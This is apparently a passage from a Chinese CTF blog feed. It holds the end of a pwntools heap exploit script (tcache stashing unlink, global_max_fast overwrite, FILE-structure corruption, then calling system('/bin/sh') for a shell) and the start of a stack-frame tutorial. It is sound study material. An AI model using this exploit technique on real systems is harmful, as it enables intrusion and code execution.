punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'ent: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tlibc_base<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x00\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span><span class=\"token number\">96</span><span class=\"token operator\">-</span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tbinsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tsystem<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tfree_hook<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tglobal_max_fast<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1eeb80</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\tshow<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'ent: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\theap_base<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">0x110</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'heap_base'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>heap_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#6</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#7</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#8</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x108</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>heap_base<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1eeb80</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#9</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token comment\">#tcache_stashing_unlink over</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0x90</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#10</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#11</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#12</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#13</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tpayload<span class=\"token operator\">=</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x28</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_file_jumps'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>libc_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad2887</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">7</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">132</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x0a'</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1ee4c0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1eb880</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x14</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_file_jumps'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\tpayload<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20f</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t<span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\toffset<span class=\"token operator\">=</span>b<span class=\"token operator\">-</span><span class=\"token number\">0x7f0b79060000</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\tc<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1f</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">0x7f0000000000</span> <span class=\"token keyword\">and</span> u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0x800000000000</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t\t\t\tc<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>offset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\t\tc<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> c</pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\tfd<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./2'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0xa0</span><span class=\"token operator\">+</span><span class=\"token number\">0x1f8</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#14~15\\</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\tpayload<span class=\"token operator\">=</span>fd<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\tfd<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\tpayload<span class=\"token operator\">=</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20f</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token operator\">+</span>i<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0xa0</span><span class=\"token operator\">+</span><span class=\"token number\">0x1f8</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\tpayload<span class=\"token operator\">=</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x148</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token operator\">+</span>i<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>exp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/pwn/",
            "url": "https://zephyr-cyber.github.io.git/pwn/",
            "title": "pwn学习(1)",
            "date_published": "2021-12-01T01:05:47.235Z",
            "content_html": "<h1 id=\"pwn学习1\"><a class=\"anchor\" href=\"#pwn学习1\">#</a> pwn 学习 1</h1>\n<p>一张汇编图片<br />\n<img data-src=\"/img/PWN/huibian1.jpg\" alt=\"avatar\" /></p>\n<p>栈帧结构</p>\n<h1 id=\"fig-1函数调用发生和结束时调用栈的变化\"><a class=\"anchor\" href=\"#fig-1函数调用发生和结束时调用栈的变化\">#</a> Fig 1. 函数调用发生和结束时调用栈的变化</h1>\n<p>esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。\u000b<br />\n下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态<br />\n<img data-src=\"/img/PWN/fig1.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-2将被调用函数的参数压入栈内\"><a class=\"anchor\" href=\"#fig-2将被调用函数的参数压入栈内\">#</a> Fig 2. 将被调用函数的参数压入栈内</h1>\n<p>将被调用函数的参数压入栈内<br />\n首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。<br />\n<img data-src=\"/img/PWN/fig2.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-3将被调用函数的返回地址压入栈内\"><a class=\"anchor\" href=\"#fig-3将被调用函数的返回地址压入栈内\">#</a> Fig 3. 将被调用函数的返回地址压入栈内</h1>\n<p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。<br />\n<img data-src=\"/img/PWN/fig3.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-4将调用函数的基地址ebp压入栈内并将当前栈顶地址传到-ebp-寄存器内\"><a class=\"anchor\" href=\"#fig-4将调用函数的基地址ebp压入栈内并将当前栈顶地址传到-ebp-寄存器内\">#</a> Fig 4. 将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内</h1>\n<p>再将当前的 ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。<br />\n<img data-src=\"/img/PWN/fig4.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-5将被调用函数的局部变量压入栈内\"><a class=\"anchor\" href=\"#fig-5将被调用函数的局部变量压入栈内\">#</a> Fig 5. 将被调用函数的局部变量压入栈内</h1>\n<p>再之后是将被调用函数（callee）的局部变量等数据压入栈内。。<br />\n<img data-src=\"/img/PWN/fig5.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-6将被调用函数的局部变量弹出栈外\"><a class=\"anchor\" href=\"#fig-6将被调用函数的局部变量弹出栈外\">#</a> Fig 6. 将被调用函数的局部变量弹出栈外</h1>\n<p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。\u000b<br />\n看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。\u000b<br />\n首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。<br />\n<img data-src=\"/img/PWN/fig6.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-7\"><a class=\"anchor\" href=\"#fig-7\">#</a> Fig 7.</h1>\n<p>将调用函数（caller）的基地址（ebp）弹出栈外，并存到 ebp 寄存器内<br />\n然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。<br />\n<img data-src=\"/img/PWN/fig7.jpg\" alt=\"avatar\" 